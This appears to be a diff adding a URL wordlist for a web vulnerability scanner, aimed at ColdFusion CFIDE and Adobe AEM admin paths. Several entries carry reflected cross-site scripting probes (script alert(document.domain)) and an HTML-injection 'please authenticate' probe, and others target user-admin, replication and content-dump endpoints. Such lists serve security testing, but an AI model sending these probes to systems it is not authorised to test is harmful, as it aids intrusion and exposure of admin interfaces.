@@ -1,0 +1,27 @@
+/CFIDE/wizards/common/_logintowizard.cfm?%22%3E%3C%2Fscript%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E
+/cf_scripts/scripts/ajax/package/cfajax.js
+/cf-scripts/scripts/ajax/package/cfajax.js
+/CFIDE/scripts/ajax/package/cfajax.js
+/cfide/scripts/ajax/package/cfajax.js
+/CF_SFSD/scripts/ajax/package/cfajax.js
+/cfide-scripts/ajax/package/cfajax.js
+/cfmx/CFIDE/scripts/ajax/package/cfajax.js
+/system/download?download-url=/_a7/p49dm7f4qjyt/output/&name=exam.pdf
+/{{string}}
+//{{string}}
+/{{string}}%22>%3Cscript%3Ealert(document.domain)%3C/script%3E/..CFIDE/administrator/index.cfm
+//{{string}}%22>%3Cscript%3Ealert(document.domain)%3C/script%3E/..CFIDE/administrator/index.cfm
+/{{string}}%22>%3Cscript%3Ealert(document.domain)%3C/script%3E/..CFIDE/wizards/common/_authenticatewizarduser.cfm
+//{{string}}%22>%3Cscript%3Ealert(document.domain)%3C/script%3E/..CFIDE/wizards/common/_authenticatewizarduser.cfm
+/etc/acs-commons/jcr-compare.html
+/etc/acs-commons/workflow-remover.html
+/etc/acs-commons/version-compare.html
+/etc/acs-commons/oak-index-manager.html
+/{{rand_base(4)}}<img src=x data
+/{{rand_base(4)}}<br><br>please%20authenticate<br><br>.childrenlist.html
+/content.infinity.json
+/{{path}}
+/jcr:content.json
+/etc/replication/agents.author/publish/jcr:content.json
+/libs/granite/offloading/content/view.html
+/libs/granite/security/content/useradmin.html
